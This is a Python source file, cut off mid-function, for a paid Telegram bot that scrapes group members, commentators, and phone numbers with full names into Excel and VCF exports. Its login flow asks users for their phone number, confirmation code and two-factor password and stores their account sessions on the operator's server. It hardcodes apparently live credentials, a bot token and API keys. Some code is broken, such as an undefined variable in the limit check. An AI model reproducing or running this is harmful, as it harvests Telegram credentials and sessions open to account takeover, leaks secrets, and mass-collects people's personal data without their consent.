import asyncio
import os
import sys
import traceback
import json
import io
import pandas as pd
import requests
import vobject
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient, errors as telethon_errors
from telethon import tl
from telegram import error as telegram_error
from datetime import datetime, timedelta
from firebase_admin import credentials, db, initialize_app
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()

# Указываем переменные через код или переменные среды
API_ID = int(os.environ.get('API_ID', 25281388))
API_HASH = os.environ.get('API_HASH', 'a2e719f61f40ca912567c7724db5764e')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7981019134:AAHGkn_2ACcS76NbtQDY7L7pAONIPmMSYoA')
LOG_CHANNEL_ID = -1002342891238
SUBSCRIPTION_CHANNEL_ID = -1002425905138
SUPPORT_USERNAME = '@alex_strayker'
TON_WALLET_ADDRESS = 'UQAP4wrP0Jviy03CTeniBjSnAL5UHvcMFtxyi1Ip1exl9pLu'
TON_API_KEY = os.environ.get('TON_API_KEY', 'YOUR_TON_API_KEY')
ADMIN_IDS = ['282198872']

# Инициализация Firebase
if not os.getenv('FIREBASE_SERVICE_ACCOUNT_KEY'):
    raise ValueError("FIREBASE_SERVICE_ACCOUNT_KEY не указан в переменных окружения")
service_account_data = json.loads(os.environ.get('FIREBASE_SERVICE_ACCOUNT_KEY'))
with open('serviceAccountKey.json', 'w') as f:
    json.dump(service_account_data, f)
cred = credentials.Certificate('serviceAccountKey.json')
initialize_app(cred, {
    'databaseURL': os.environ.get('FIREBASE_DATABASE_URL', 'https://tgparser-f857c-default-rtdb.firebaseio.com')
})

# База данных пользователей
DB_FILE = 'users.json'
if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f:
        json.dump({}, f)

def load_users():
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, 'w') as f:
        json.dump(users, f, indent=4)

# Функция для получения клиента Telethon для конкретного пользователя
def get_telethon_client(user_id):
    session_name = f"sessions/session_{user_id}"
    return TelegramClient(session_name, API_ID, API_HASH)

# Сохранение данных сессии в Firebase
async def save_session_data(user_id, data):
    ref = db.reference(f'sessions/{user_id}')
    ref.set(data)

# Языковые переводы (без изменений)
LANGUAGES = {
    'Русский': {
        'welcome': 'Привет! Выбери язык общения:',
        'enter_phone': 'Введите номер телефона в формате +380639678038 для авторизации:',
        'enter_code': 'Введите код подтверждения, который вы получили в SMS или Telegram:',
        'enter_password': 'Требуется пароль двухфакторной аутентификации. Введите пароль:',
        'auth_success': 'Авторизация успешно завершена!',
        'auth_error': 'Ошибка авторизации: {error}. Попробуйте снова с /start.',
        'choose_language': 'Выбери язык:',
        'subscribe': 'Подпишись на канал: https://t.me/tgparseruser\nПосле подписки нажми "Продолжить".',
        'subscribed': 'Продолжить',
        'you_chose': 'Вы выбрали: {button}',
        'skip': 'Пропустить',
        'start_menu': 'Вы: {name}\nВаш ID: {user_id}\nВыбран язык: {lang} /language\nТип подписки: {sub_type}\nВаша подписка закончится через: {sub_time}\nВсего запросов сделано: {requests}\nОсталось запросов сегодня: {limit}',
        'identifiers': 'Отправь мне @username, ссылку на публикацию или перешли сообщение, чтобы узнать ID.',
        'parser': 'Выбери, что хочешь спарсить:',
        'subscribe_button': 'Оформить подписку',
        'support': 'Поддержка: {support}',
        'requisites': 'Возможности оплаты:\n1. [Метод 1]\n2. [Метод 2]\nСвяжитесь с {support} для оплаты.',
        'logs_channel': 'Канал с логами: t.me/YourLogChannel',
        'link_group': 'Отправь мне ссылку на группу или канал, например: https://t.me/group_name, @group_name или group_name\nМожно указать несколько ссылок через Enter.',
        'link_post': 'Отправь мне ссылку на пост, например: https://t.me/channel_name/12345\nИли перешли пост. Можно указать несколько ссылок через Enter.',
        'limit': 'Сколько пользователей парсить? Выбери или укажи своё число (макс. 5000 авторов/15000 участников для платных подписок, 150 для бесплатной).',
        'filter_username': 'Фильтровать только пользователей с username?',
        'filter_bots': 'Исключить ботов?',
        'filter_active': 'Только активных недавно (за 30 дней)?',
        'invalid_limit': 'Укажи число от 1 до {max_limit}!',
        'invalid_number': 'Пожалуйста, укажи число!',
        'invalid_link': 'Пожалуйста, отправь корректную ссылку на пост/чат, например: https://t.me/channel_name/12345, @channel_name или channel_name\nИли несколько ссылок через Enter.',
        'fix_link': 'Если ты ошибся, могу помочь исправить ссылку.',
        'suggest_link': 'Ты имел в виду: {link}?',
        'retry_link': 'Отправь ссылку заново:',
        'no_access': 'Ошибка: у меня нет доступа к {link}. Убедись, что я добавлен в чат или он публичный.',
        'flood_error': 'Ошибка: {e}',
        'rpc_error': 'Ошибка: {e}',
        'new_user': 'Новый пользователь: {name} (ID: {user_id})',
        'language_cmd': 'Выбери новый язык:',
        'caption_commentators': 'Вот ваш файл с комментаторами.',
        'caption_participants': 'Вот ваш файл с участниками.',
        'caption_post_commentators': 'Вот ваш файл с комментаторами поста.',
        'limit_reached': 'Ты исчерпал дневной лимит ({limit} запросов). Попробуй снова через {hours} часов.',
        'id_result': 'ID: {id}',
        'close': 'Закрыть',
        'continue_id': 'Продолжить',
        'subscription_1h': 'Подписка на 1 час - 2 USDT (TON)',
        'subscription_3d': 'Подписка на 3 дня - 5 USDT (TON)',
        'subscription_7d': 'Подписка на 7 дней - 7 USDT (TON)',
        'payment_wallet': 'Переведите {amount} USDT на кошелёк TON:\n{address}\nПосле оплаты нажмите "Я оплатил".',
        'payment_cancel': 'Отменить',
        'payment_paid': 'Я оплатил',
        'payment_hash': 'Отправьте хеш транзакции:',
        'payment_pending': 'Транзакция отправлена в обработку',
        'payment_update': 'Обновить',
        'payment_success': 'Подписка успешно оформлена!\nВаша подписка активирована до {end_time}.',
        'payment_error': 'Ваша транзакция была не удачной!\nПодать аппеляцию можно написав пользователю @astrajker_cb_id.',
        'entity_error': 'Не удалось получить информацию о пользователе. Пользователь может быть приватным или недоступным.',
        'no_filter': 'Не применять фильтр',
        'phone_contacts': 'Сбор номеров телефонов и ФИО',
        'auth_access': 'Авторизация для закрытых чатов',
        'caption_phones': 'Вот ваш файл с номерами телефонов и ФИО (Excel и VCF).',
        'auth_request': 'Для доступа к закрытым чатам добавьте бота в чат как администратора или отправьте ссылку на закрытый чат.',
        'auth_success': 'Доступ к закрытому чату успешно предоставлен!',
        'auth_error': 'Не удалось получить доступ. Убедитесь, что бот добавлен как администратор или чат публичный.',
        'note_cmd': 'Заметка успешно сохранена (бот не будет реагировать).'
    },
    'Украинский': {
        'welcome': 'Привіт! Обери мову спілкування:',
        'enter_phone': 'Введи номер телефону у форматі +380639678038 для авторизації:',
        'enter_code': 'Введи код підтвердження, який ти отримав у SMS або Telegram:',
        'enter_password': 'Потрібен пароль двофакторної аутентифікації. Введи пароль:',
        'auth_success': 'Авторизація успішно завершена!',
        'auth_error': 'Помилка авторизації: {error}. Спробуй знову з /start.',
        'choose_language': 'Обери мову:',
        'subscribe': 'Підпишись на канал: https://t.me/tgparseruser\nПісля підписки натисни "Продовжити".',
        'subscribed': 'Продовжити',
        'you_chose': 'Ви обрали: {button}',
        'skip': 'Пропустити',
        'start_menu': 'Ви: {name}\nВаш ID: {user_id}\nОбрана мова: {lang} /language\nТип підписки: {sub_type}\nВаша підписка закінчиться через: {sub_time}\nВсього запитів зроблено: {requests}\nЗалишилось запитів сьогодні: {limit}',
        'identifiers': 'Надішли мені @username, посилання на публікацію або перешли повідомлення, щоб дізнатися ID.',
        'parser': 'Обери, що хочеш спарсити:',
        'subscribe_button': 'Оформити підписку',
        'support': 'Підтримка: {support}',
        'requisites': 'Можливості оплати:\n1. [Метод 1]\n2. [Метод 2]\nЗв’яжіться з {support} для оплати.',
        'logs_channel': 'Канал з логами: t.me/YourLogChannel',
        'link_group': 'Надішли мені посилання на групу або канал, наприклад: https://t.me/group_name, @group_name або group_name\nМожна вказати кілька посилань через Enter.',
        'link_post': 'Надішли мені посилання на пост, наприклад: https://t.me/channel_name/12345\nАбо перешли пост. Можна вказати кілька посилань через Enter.',
        'limit': 'Скільки користувачів парсити? Обери або вкажи своє число (макс. 5000 авторів/15000 учасників для платних підписок, 150 для безкоштовної).',
        'filter_username': 'Фільтрувати лише користувачів з username?',
        'filter_bots': 'Виключити ботів?',
        'filter_active': 'Тільки активних нещодавно (за 30 днів)?',
        'invalid_limit': 'Вкажи число від 1 до {max_limit}!',
        'invalid_number': 'Будь ласка, вкажи число!',
        'invalid_link': 'Будь ласка, надішли коректне посилання на пост/чат, наприклад: https://t.me/channel_name/12345, @channel_name або channel_name\nАбо кілька посилань через Enter.',
        'fix_link': 'Якщо ти помилився, можу допомогти виправити посилання.',
        'suggest_link': 'Ти мав на увазі: {link}?',
        'retry_link': 'Надішли посилання заново:',
        'no_access': 'Помилка: у мене немає доступу до {link}. Переконайся, що я доданий до чату або він публічний.',
        'flood_error': 'Помилка: {e}',
        'rpc_error': 'Помилка: {e}',
        'new_user': 'Новий користувач: {name} (ID: {user_id})',
        'language_cmd': 'Обери нову мову:',
        'caption_commentators': 'Ось ваш файл з коментаторами.',
        'caption_participants': 'Ось ваш файл з учасниками.',
        'caption_post_commentators': 'Ось ваш файл з коментаторами поста.',
        'limit_reached': 'Ти вичерпав денний ліміт ({limit} запитів). Спробуй знову через {hours} годин.',
        'id_result': 'ID: {id}',
        'close': 'Закрити',
        'continue_id': 'Продолжити',
        'subscription_1h': 'Підписка на 1 годину - 2 USDT (TON)',
        'subscription_3d': 'Підписка на 3 дні - 5 USDT (TON)',
        'subscription_7d': 'Підписка на 7 днів - 7 USDT (TON)',
        'payment_wallet': 'Переведіть {amount} USDT на гаманець TON:\n{address}\nПісля оплати натисніть "Я оплатив".',
        'payment_cancel': 'Скасувати',
        'payment_paid': 'Я оплатив',
        'payment_hash': 'Надішліть хеш транзакції:',
        'payment_pending': 'Транзакція відправлена в обробку',
        'payment_update': 'Оновити',
        'payment_success': 'Підписка успішно оформлена!\nВаша підписка активована до {end_time}.',
        'payment_error': 'Ваша транзакція була не вдалою!\nПодати апеляцію можна написавши користувачу @astrajker_cb_id.',
        'entity_error': 'Не вдалося отримати інформацію про користувача. Користувач може бути приватним або недоступним.',
        'no_filter': 'Не застосовувати фільтр',
        'phone_contacts': 'Збір номерів телефонів та ПІБ',
        'auth_access': 'Авторизація для закритих чатів',
        'caption_phones': 'Ось ваш файл з номерами телефонів та ПІБ (Excel і VCF).',
        'auth_request': 'Для доступу до закритих чатів додайте бота в чат як адміністратора або надішліть посилання на закритий чат.',
        'auth_success': 'Доступ до закритого чату успішно надано!',
        'auth_error': 'Не вдалося отримати доступ. Переконайтесь, що бот доданий як адміністратор або чат публічний.',
        'note_cmd': 'Примітка успішно збережено (бот не реагуватиме).'
    },
    'English': {
        'welcome': 'Hello! Choose your language:',
        'enter_phone': 'Enter your phone number in the format +380639678038 for authorization:',
        'enter_code': 'Enter the confirmation code you received via SMS or Telegram:',
        'enter_password': 'Two-factor authentication password required. Enter your password:',
        'auth_success': 'Authorization completed successfully!',
        'auth_error': 'Authorization error: {error}. Try again with /start.',
        'choose_language': 'Choose language:',
        'subscribe': 'Subscribe to the channel: https://t.me/tgparseruser\nAfter subscribing, press "Continue".',
        'subscribed': 'Continue',
        'you_chose': 'You chose: {button}',
        'skip': 'Skip',
        'start_menu': 'You: {name}\nYour ID: {user_id}\nSelected language: {lang} /language\nSubscription type: {sub_type}\nYour subscription ends in: {sub_time}\nTotal requests made: {requests}\nRequests left today: {limit}',
        'identifiers': 'Send me @username, a post link, or forward a message to find out the ID.',
        'parser': 'Choose what you want to parse:',
        'subscribe_button': 'Subscribe',
        'support': 'Support: {support}',
        'requisites': 'Payment options:\n1. [Method 1]\n2. [Method 2]\nContact {support} for payment.',
        'logs_channel': 'Logs channel: t.me/YourLogChannel',
        'link_group': 'Send me a link to a group or channel, e.g.: https://t.me/group_name, @group_name or group_name\nYou can specify multiple links via Enter.',
        'link_post': 'Send me a link to a post, e.g.: https://t.me/channel_name/12345\nOr forward a post. You can specify multiple links via Enter.',
        'limit': 'How many users to parse? Choose or enter your number (max 5,000 authors/15,000 participants for paid subscriptions, 150 for free).',
        'filter_username': 'Filter only users with username?',
        'filter_bots': 'Exclude bots?',
        'filter_active': 'Only recently active (within 30 days)?',
        'invalid_limit': 'Enter a number from 1 to {max_limit}!',
        'invalid_number': 'Please enter a number!',
        'invalid_link': 'Please send a valid post/chat link, e.g.: https://t.me/channel_name/12345, @channel_name or channel_name\nOr multiple links via Enter.',
        'fix_link': 'If you made a mistake, I can help fix the link.',
        'suggest_link': 'Did you mean: {link}?',
        'retry_link': 'Send the link again:',
        'no_access': 'Error: I don’t have access to {link}. Make sure I’m added to the chat or it’s public.',
        'flood_error': 'Error: {e}',
        'rpc_error': 'Error: {e}',
        'new_user': 'New user: {name} (ID: {user_id})',
        'language_cmd': 'Choose a new language:',
        'caption_commentators': 'Here is your file with commentators.',
        'caption_participants': 'Here is your file with participants.',
        'caption_post_commentators': 'Here is your file with post commentators.',
        'limit_reached': 'You’ve reached the daily limit ({limit} requests). Try again in {hours} hours.',
        'id_result': 'ID: {id}',
        'close': 'Close',
        'continue_id': 'Continue',
        'subscription_1h': '1 Hour Subscription - 2 USDT (TON)',
        'subscription_3d': '3 Days Subscription - 5 USDT (TON)',
        'subscription_7d': '7 Days Subscription - 7 USDT (TON)',
        'payment_wallet': 'Transfer {amount} USDT to the TON wallet:\n{address}\nAfter payment, press "I Paid".',
        'payment_cancel': 'Cancel',
        'payment_paid': 'I Paid',
        'payment_hash': 'Send the transaction hash:',
        'payment_pending': 'Transaction sent for processing',
        'payment_update': 'Update',
        'payment_success': 'Subscription successfully activated!\nYour subscription is active until {end_time}.',
        'payment_error': 'Your transaction was unsuccessful!\nYou can appeal by contacting @astrajker_cb_id.',
        'entity_error': 'Could not retrieve user information. The user may be private or inaccessible.',
        'no_filter': 'Do not apply filter',
        'phone_contacts': 'Collect phone numbers and full names',
        'auth_access': 'Authorize for private chats',
        'caption_phones': 'Here is your file with phone numbers and full names (Excel and VCF).',
        'auth_request': 'To access private chats, add the bot as an admin or send a link to a private chat.',
        'auth_success': 'Access to the private chat successfully granted!',
        'auth_error': 'Could not gain access. Ensure the bot is added as an admin or the chat is public.',
        'note_cmd': 'Note successfully saved (bot will not respond).'
    },
    'Deutsch': {
        'welcome': 'Hallo! Wähle deine Sprache:',
        'enter_phone': 'Gib deine Telefonnummer im Format +380639678038 für die Autorisierung ein:',
        'enter_code': 'Gib den Bestätigungscode ein, den du per SMS oder Telegram erhalten hast:',
        'enter_password': 'Passwort für die Zwei-Faktor-Authentifizierung erforderlich. Gib dein Passwort ein:',
        'auth_success': 'Autorisierung erfolgreich abgeschlossen!',
        'auth_error': 'Autorisierungsfehler: {error}. Versuche es erneut mit /start.',
        'choose_language': 'Wähle eine Sprache:',
        'subscribe': 'Abonniere den Kanal: https://t.me/tgparseruser\nDrücke nach dem Abonnieren "Fortfahren".',
        'subscribed': 'Fortfahren',
        'you_chose': 'Du hast gewählt: {button}',
        'skip': 'Überspringen',
        'start_menu': 'Du: {name}\nDeine ID: {user_id}\nGewählte Sprache: {lang} /language\nAbonnementtyp: {sub_type}\nDein Abonnement endet in: {sub_time}\nGesamte Anfragen: {requests}\nVerbleibende Anfragen heute: {limit}',
        'identifiers': 'Sende mir @username, einen Beitrag-Link oder leite eine Nachricht weiter, um die ID herauszufinden.',
        'parser': 'Wähle, was du parsen möchtest:',
        'subscribe_button': 'Abonnement abschließen',
        'support': 'Support: {support}',
        'requisites': 'Zahlungsmöglichkeiten:\n1. [Methode 1]\n2. [Methode 2]\nKontaktiere {support} für die Zahlung.',
        'logs_channel': 'Log-Kanal: t.me/YourLogChannel',
        'link_group': 'Sende mir einen Link zu einer Gruppe oder einem Kanal, z.B.: https://t.me/group_name, @group_name oder group_name\nDu kannst mehrere Links mit Enter angeben.',
        'link_post': 'Sende mir einen Link zu einem Beitrag, z.B.: https://t.me/channel_name/12345\nOder leite einen Beitrag weiter. Du kannst mehrere Links mit Enter angeben.',
        'limit': 'Wie viele Benutzer sollen geparst werden? Wähle oder gib eine Zahl ein (max. 5.000 Autoren/15.000 Teilnehmer für bezahlte Abonnements, 150 für kostenlos).',
        'filter_username': 'Nur Benutzer mit Username filtern?',
        'filter_bots': 'Bots ausschließen?',
        'filter_active': 'Nur kürzlich aktive (innerhalb von 30 Tagen)?',
        'invalid_limit': 'Gib eine Zahl von 1 bis {max_limit} ein!',
        'invalid_number': 'Bitte gib eine Zahl ein!',
        'invalid_link': 'Bitte sende einen gültigen Beitrag/Chat-Link, z.B.: https://t.me/channel_name/12345, @channel_name oder channel_name\nOder mehrere Links mit Enter.',
        'fix_link': 'Wenn du einen Fehler gemacht hast, kann ich den Link korrigieren.',
        'suggest_link': 'Meintest du: {link}?',
        'retry_link': 'Sende den Link erneut:',
        'no_access': 'Fehler: Ich habe keinen Zugriff auf {link}. Stelle sicher, dass ich zum Chat hinzugefügt bin oder er öffentlich ist.',
        'flood_error': 'Fehler: {e}',
        'rpc_error': 'Fehler: {e}',
        'new_user': 'Neuer Benutzer: {name} (ID: {user_id})',
        'language_cmd': 'Wähle eine neue Sprache:',
        'caption_commentators': 'Hier ist deine Datei mit Kommentatoren.',
        'caption_participants': 'Hier ist deine Datei mit Teilnehmern.',
        'caption_post_commentators': 'Hier ist deine Datei mit Beitragskommentatoren.',
        'limit_reached': 'Du hast das tägliche Limit ({limit} Anfragen) erreicht. Versuche es in {hours} Stunden erneut.',
        'id_result': 'ID: {id}',
        'close': 'Schließen',
        'continue_id': 'Fortfahren',
        'subscription_1h': '1 Stunde Abonnement - 2 USDT (TON)',
        'subscription_3d': '3 Tage Abonnement - 5 USDT (TON)',
        'subscription_7d': '7 Tage Abonnement - 7 USDT (TON)',
        'payment_wallet': 'Überweise {amount} USDT auf den TON-Wallet:\n{address}\nNach der Zahlung drücke "Ich habe bezahlt".',
        'payment_cancel': 'Abbrechen',
        'payment_paid': 'Ich habe bezahlt',
        'payment_hash': 'Sende den Transaktionshash:',
        'payment_pending': 'Transaktion zur Verarbeitung gesendet',
        'payment_update': 'Aktualisieren',
        'payment_success': 'Abonnement erfolgreich aktiviert!\nDein Abonnement ist aktiv bis {end_time}.',
        'payment_error': 'Deine Transaktion war nicht erfolgreich!\nDu kannst einen Einspruch bei @astrajker_cb_id einreichen.',
        'entity_error': 'Konnte keine Benutzerinformationen abrufen. Der Benutzer könnte privat oder nicht zugänglich sein.',
        'no_filter': 'Keinen Filter anwenden',
        'phone_contacts': 'Telefonnummern und vollständige Namen sammeln',
        'auth_access': 'Autorisierung für private Chats',
        'caption_phones': 'Hier ist deine Datei mit Telefonnummern und vollständigen Namen (Excel und VCF).',
        'auth_request': 'Um auf private Chats zuzugreifen, füge den Bot als Administrator hinzu oder sende einen Link zu einem privaten Chat.',
        'auth_success': 'Zugang zum privaten Chat erfolgreich gewährt!',
        'auth_error': 'Konnte keinen Zugriff erhalten. Stelle sicher, dass der Bot als Administrator hinzugefügt wurde oder der Chat öffentlich ist.',
        'note_cmd': 'Notiz erfolgreich gespeichert (der Bot wird nicht reagieren).'
    }
}

# Логирование в канал
async def log_to_channel(context, message, username=None):
    try:
        user = context.user_data.get('user', {})
        name = user.get('name', username or 'Неизвестно')
        log_message = f"{message}"
        if username:
            log_message = f"{name} (@{username}): {message}"
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message)
    except telegram_error.BadRequest as e:
        print(f"Ошибка при отправке лога в канал: {e}")

# Обновление пользовательских данных
def update_user_data(user_id, name, context, lang=None, subscription=None, requests=0):
    users = load_users()
    user_id_str = str(user_id)
    now = datetime.now()
    if user_id_str not in users:
        users[user_id_str] = {
            'name': name,
            'language': lang or 'Русский',
            'subscription': subscription or {'type': 'Бесплатная', 'end': None},
            'requests': 0,
            'daily_requests': {'count': 0, 'last_reset': now.isoformat()}
        }
    user = users[user_id_str]
    if 'daily_requests' not in user or not isinstance(user['daily_requests'], dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    if lang:
        user['language'] = lang
    if subscription:
        user['subscription'] = subscription
    last_reset = datetime.fromisoformat(user['daily_requests']['last_reset'])
    if (now - last_reset).days >= 1:
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
    user['requests'] = user.get('requests', 0) + requests
    user['daily_requests']['count'] += requests
    user['name'] = name
    context.user_data['user'] = user
    save_users(users)
    return user

# Проверка лимита запросов
def check_request_limit(user_id):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    now = datetime.now()
    if 'daily_requests' not in user or not isinstance(user.get('daily_requests'), dict):
        user['daily_requests'] = {'count': 0, 'last_reset': now.isoformat()}
        save_users(users)
    daily_requests = user['daily_requests']
    last_reset = datetime.fromisoformat(daily_requests['last_reset'])
    if (now - last_reset).days >= 1:
        daily_requests = {'count': 0, 'last_reset': now.isoformat()}
        users[user_id_str]['daily_requests'] = daily_requests
        save_users(users)
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    max_requests = 5 if subscription['type'] == 'Бесплатная' else float('inf')
    return daily_requests['count'] < max_requests, 24 - (now - last_reset).seconds // 3600

# Проверка лимита парсинга
def check_parse_limit(user_id, limit, parse_type):
    users = load_users()
    user_id_str = str(user_id)
    user = users.get(user_id_str, {})
    subscription = user.get('subscription', {'type': 'Бесплатная', 'end': None})
    now = datetime.now()
    if subscription['type'].startswith('Платная') and subscription['end']:
        if datetime.fromisoformat(subscription['end']) < now:
            update_user_data(user_id, user.get('name', 'Неизвестно'), None, subscription={'type': 'Бесплатная', 'end': None})
            lang = user.get('language', 'Русский')
            texts = LANGUAGES[lang]
            loop = asyncio.get_event_loop()
            loop.run_until_complete(
                context.bot.send_message(chat_id=user_id, text="⚠️ Ваша платная подписка истекла. Теперь у вас бесплатная подписка с лимитом 150 пользователей на парсинг." if lang == 'Русский' else 
                                        "⚠️ Ваша платна підписка закінчилася. Тепер у вас безкоштовна підписка з лімітом 150 користувачів на парсинг." if lang == 'Украинский' else 
                                        "⚠️ Your paid subscription has expired. You now have a free subscription with a limit of 150 users for parsing." if lang == 'English' else 
                                        "⚠️ Dein bezahltes Abonnement ist abgelaufen. Du hast jetzt ein kostenloses Abonnement mit einem Limit von 150 Benutzern zum Parsen.")
            )
            subscription = {'type': 'Бесплатная', 'end': None}
    
    if subscription['type'] == 'Бесплатная':
        return min(limit, 150)
    elif parse_type == 'parse_authors':
        return min(limit, 5000)
    elif parse_type == 'parse_participants':
        return min(limit, 15000)
    elif parse_type == 'parse_post_commentators':
        return limit
    else:
        return min(limit, 15000)

# Создание файла Excel
async def create_excel_in_memory(data):
    df = pd.DataFrame(data, columns=['ID', 'Username', 'First Name', 'Last Name', 'Bot', 'Nickname'])
    df['Nickname'] = '@' + df['Nickname'].astype(str)
    excel_file = io.BytesIO()
    with pd.ExcelWriter(excel_file, engine='xlsxwriter') as writer:
        df.to_excel(writer, index=False, sheet_name='Sheet1')
        workbook = writer.book
        worksheet = writer.sheets['Sheet1']
        for idx, col in enumerate(df.columns):
            series = df[col]
            max_length = max((series.astype(str).map(len).max(), len(str(series.name)))) + 2
            worksheet.set_column(idx, idx, max_length)
    excel_file.seek(0)
    return excel_file

# Создание VCF файла для контактов
def create_vcf_file(data):
    vcf_content = io.BytesIO()
    for _, row in data.iterrows():
        if row['Phone'] and row['First Name']:
            vcard = vobject.vCard()
            vcard.add('fn').value = f"{row['First Name']} {row['Last Name']}".strip()
            vcard.add('tel').value = row['Phone']
            vcard.add('url').value = f"https://t.me/{row['Username']}" if row['Username'] else ""
            vcf_content.write(str(vcard).encode('utf-8'))
            vcf_content.write(b'\n')
    vcf_content.seek(0)
    return vcf_content

# Фильтрация данных
def filter_data(data, filters):
    filtered_data = data
    if filters.get('only_with_username'):
        filtered_data = [row for row in filtered_data if row[1]]
    if filters.get('exclude_bots'):
        filtered_data = [row for row in filtered_data if not row[4]]
    if filters.get('only_active'):
        filtered_data = [row for row in filtered_data if is_active_recently(row[5])]
    return filtered_data

def is_active_recently(user):
    if not user or not hasattr(user, 'status') or not user.status:
        return True
    if hasattr(user.status, 'was_online'):
        return (datetime.now() - user.status.was_online).days < 30
    return True

# Подсчёт статистики
def get_statistics(data):
    total = len(data)
    with_username = sum(1 for row in data if row[1])
    bots = sum(1 for row in data if row[4])
    without_name = sum(1 for row in data if not row[2] and not row[3])
    return f"Всего: {total}\nС username: {with_username}\nБотов: {bots}\nБез имени: {without_name}"

# Получение главного меню
def get_main_menu(user_id, context):
    users = load_users()
    user_id_str = str(user_id)
    user_data = users.get(user_id_str, {})
    lang = user_data.get('language', 'Русский')
    texts = LANGUAGES[lang]
    sub_type = user_data.get('subscription', {}).get('type', 'Бесплатная')
    sub_end = user_data.get('subscription', {}).get('end')
    sub_time = '—' if sub_type == 'Бесплатная' else (
        'бессрочно' if sub_end is None else 
        f"{(datetime.fromisoformat(sub_end) - datetime.now()).days * 24 + (datetime.fromisoformat(sub_end) - datetime.now()).seconds // 3600} часов"
    )
    requests = user_data.get('requests', 0)
    name = user_data.get('name', 'Неизвестно')
    limit_left, hours_left = check_request_limit(user_id)
    limit_display = 5 if sub_type == 'Бесплатная' else 10 - user_data.get('daily_requests', {}).get('count', 0)
    
    is_admin = user_id_str in ADMIN_IDS
    
    buttons = [
        [InlineKeyboardButton("Идентификаторы" if lang == 'Русский' else "Ідентифікатори" if lang == 'Украинский' else "Identifiers" if lang == 'English' else "Identifikatoren", callback_data='identifiers'), 
         InlineKeyboardButton("(!)", callback_data='info_identifiers')],
        [InlineKeyboardButton("Сбор данных / Парсер" if lang == 'Русский' else "Збір даних / Парсер" if lang == 'Украинский' else "Data collection / Parser" if lang == 'English' else "Datensammlung / Parser", callback_data='parser'), 
         InlineKeyboardButton("(!)", callback_data='info_parser')],
        [InlineKeyboardButton(texts['subscribe_button'], callback_data='subscribe'), InlineKeyboardButton("(!)", callback_data='info_subscribe')],
        [InlineKeyboardButton(f"{texts['support'].format(support=SUPPORT_USERNAME)}", url=f"https://t.me/{SUPPORT_USERNAME[1:]}")],
        [InlineKeyboardButton("Реквизиты" if lang == 'Русский' else "Реквізити" if lang == 'Украинский' else "Requisites" if lang == 'English' else "Zahlungsdaten", callback_data='requisites'), 
         InlineKeyboardButton("(!)", callback_data='info_requisites')]
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("Канал с логами" if lang == 'Русский' else "Канал з логами" if lang == 'Украинский' else "Logs channel" if lang == 'English' else "Log-Kanal", callback_data='logs_channel'), 
                        InlineKeyboardButton("(!)", callback_data='info_logs')])
    
    return texts['start_menu'].format(
        name=name, user_id=user_id, lang=lang, sub_type=sub_type, sub_time=sub_time, requests=requests, limit=limit_display
    ), InlineKeyboardMarkup(buttons)

# Обработчик команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()

    client = get_telethon_client(user_id)
    context.user_data['client'] = client

    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text(LANGUAGES['Русский']['enter_phone'])
            context.user_data['waiting_for_phone'] = True
            await log_to_channel(context, f"Запрос номера телефона у {name} (@{username})", username)
            return

        if str(user_id) not in users:
            await log_to_channel(context, LANGUAGES['Русский']['new_user'].format(name=name, user_id=user_id), username)
            keyboard = [
                [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
                [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
                [InlineKeyboardButton("English", callback_data='lang_English')],
                [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
            ]
            await update.message.reply_text(LANGUAGES['Русский']['welcome'], reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            lang = users[str(user_id)]['language']
            await update.message.reply_text(LANGUAGES[lang]['subscribe'], reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(LANGUAGES[lang]['subscribed'], callback_data='subscribed')]]))
            update_user_data(user_id, name, context)

    except telethon_errors.RPCError as e:
        await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
        await log_to_channel(context, f"Ошибка подключения/авторизации для {name} (@{username}): {str(e)}", username)
    finally:
        await client.disconnect()

# Обработчик команды /language
async def language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    name = update.effective_user.full_name or "Без имени"
    users = load_users()
    lang = users.get(str(user_id), {}).get('language', 'Русский')
    keyboard = [
        [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
        [InlineKeyboardButton("Украинский", callback_data='lang_Украинский')],
        [InlineKeyboardButton("English", callback_data='lang_English')],
        [InlineKeyboardButton("Deutsch", callback_data='lang_Deutsch')]
    ]
    await update.message.reply_text(LANGUAGES[lang]['language_cmd'], reply_markup=InlineKeyboardMarkup(keyboard))

# Обработчик команды /set_plan
async def set_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if str(user_id) not in ADMIN_IDS:
        await update.message.reply_text("У вас нет прав для этой команды.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Использование: /set_plan <user_id> <type> <duration>")
        return
    
    target_user_id, sub_type, duration = args[0], args[1], int(args[2])
    now = datetime.now()
    
    if sub_type == '1h':
        end_time = now + timedelta(hours=duration)
    elif sub_type == '3d':
        end_time = now + timedelta(days=duration)
    elif sub_type == '7d':
        end_time = now + timedelta(days=duration)
    elif sub_type == 'permanent':
        end_time = None
    else:
        await update.message.reply_text("Неверный тип подписки. Используйте '1h', '3d', '7d' или 'permanent' для админов.")
        return
    
